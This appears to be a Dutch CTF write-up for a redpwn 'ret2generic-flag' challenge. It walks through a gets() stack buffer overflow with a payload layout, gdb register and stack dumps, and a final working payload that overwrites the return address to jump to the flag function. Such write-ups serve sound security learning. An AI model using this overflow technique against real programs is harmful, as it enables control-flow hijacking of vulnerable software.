```
payload:

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccc
\---------------------------+--/\--+---/\--+---/
    0x20 random gedoe    <--/      |       |
    0x08 overschrijft $rbp      <--/       |
    0x08 overschrijft *$rsp             <--/
```

adres van `super_generic_flag_reading_function_please_ret_to_me` = 0x004011f6

```
Dump of assembler code for function main:
    ... (onbelangrijke zooi)
   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt> ; <!-- gets() (payload hier)
   0x0000000000401429 <+132>:   mov    eax,0x0
   0x000000000040142e <+137>:   leave ; <!-- -------------------- stopt delen van de payload in belangrijke registers
   0x000000000040142f <+138>:   ret ; <!-- ---------------------- return't naar ***$rsp (???)
```

gdb met payload `'a' * 0x28`
```
$rsp   : 0x00007fffffffd8a0  →  0x00007fffffffd988  →  0x00007fffffffdd8a  →  "/home/loek/docs/redpwn/challenges/ret2generic-flag[...]"
$rbp   : 0x0
$rsi   : 0x00007ffff7f7d883  →  0xf804e0000000000a
$rdi   : 0x00007ffff7f804e0  →  0x0000000000000000
$rip   : 0x00007ffff7de4b25  →  <__libc_start_main+213> mov edi, eax
$r8    : 0x00007fffffffd870  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
─── stack ────
0x00007fffffffd8a0│+0x0000: 0x00007fffffffd988  →  0x00007fffffffdd8a  →  "/home/loek/docs/redpwn/challenges/ret2generic-flag[...]"  ← $rsp
0x00007fffffffd8a8│+0x0008: 0x0000000100000064 ("d"?)
0x00007fffffffd8b0│+0x0010: 0x00000000004013a5  →  <main+0> endbr64
0x00007fffffffd8b8│+0x0018: 0x0000000000001000
0x00007fffffffd8c0│+0x0020: 0x0000000000401430  →  <__libc_csu_init+0> endbr64
0x00007fffffffd8c8│+0x0028: 0x467567ca4c3a77a3
0x00007fffffffd8d0│+0x0030: 0x0000000000401110  →  <_start+0> endbr64
0x00007fffffffd8d8│+0x0038: 0x0000000000000000
─── code:x86:64 ────
   0x7ffff7de4b1b <__libc_start_main+203> mov    rdx, QWORD PTR [rax]
   0x7ffff7de4b1e <__libc_start_main+206> mov    rax, QWORD PTR [rsp+0x10]
   0x7ffff7de4b23 <__libc_start_main+211> call   rax
 → 0x7ffff7de4b25 <__libc_start_main+213> mov    edi, eax
   0x7ffff7de4b27 <__libc_start_main+215> call   0x7ffff7dfc630 <exit>
   0x7ffff7de4b2c <__libc_start_main+220> mov    rax, QWORD PTR [rsp]
   0x7ffff7de4b30 <__libc_start_main+224> lea    rdi, [rip+0x163929]        # 0x7ffff7f48460
   0x7ffff7de4b37 <__libc_start_main+231> mov    rsi, QWORD PTR [rax]
   0x7ffff7de4b3a <__libc_start_main+234> xor    eax, eax
```

# grote breakthrough :tada:

```
payload: '\x90' * 0x28 + '\x78\x56\x34\x12'

na 0x000000000040142f <+138>: ret; worden de laatste 4 bytes van $rip overschreven
```

payload: `'\x90' * 0x28 + '\xf6\x11\x40\x00\x00\x00\x00\x00'` zorgt dat `$rip` naar `super_generic_flag_reading_function_please_ret_to_me` gaat :tada:

